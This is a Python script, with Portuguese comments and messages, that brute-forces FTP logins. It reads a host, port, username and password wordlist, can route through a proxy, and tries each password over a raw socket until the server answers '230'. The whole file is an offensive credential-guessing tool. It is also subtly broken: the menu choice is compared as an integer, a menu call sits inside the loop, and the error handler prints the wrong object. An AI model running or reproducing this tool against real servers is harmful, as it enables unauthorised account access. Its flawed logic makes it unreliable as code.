import socket, re
from colores import *
from Zerasus import menu
from time import sleep
from proxyis import proxis

try:

    select_option()
    select_proxymain()
    option = input('-> ')

    select_host()
    host = input(f"-> ")

    select_port()
    porta = int(input(f"-> "))

    select_username()
    user = input(f'-> ')

    select_wordlist()
    senhas = open(input('-> '))


    def ftp_():

        for senha in senhas.readlines():
            print(f"Realizando Brute Force FTP {user}:{senha.strip()}")

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, porta))
            s.recv(1024)

            s.send(bytes(f"USER {user}\r\n".encode("utf-8")))
            s.recv(1024)

            s.send(bytes(f"PASS {senha}\r\n".encode("utf-8")))
            resposta = s.recv(1024)  # Pegando a resposta se deu certo
            s.send(b"QUIT\r\n")

            if re.search(b"230", resposta):
                print(f"{color.CYAN}Senha Encontrada: {senha.strip()}{color.END}")
                break
            sleep(4)
            menu()

    if option == 1:
        ftp_()
    elif option == 2:
        proxis()
        ftp_()
    else:
        print(f"{color.RED}Na proxima informe uma opcao!")
        sleep(3)
        print(f"De volta para o menu!{color.END}")
        sleep(2)
        menu()

except Exception:
    print(f"{color.RED}Ocorreu um erro: {Exception}", sleep(3))
    print(f'De volta para o Menu! {color.END}', sleep(2))
    menu()
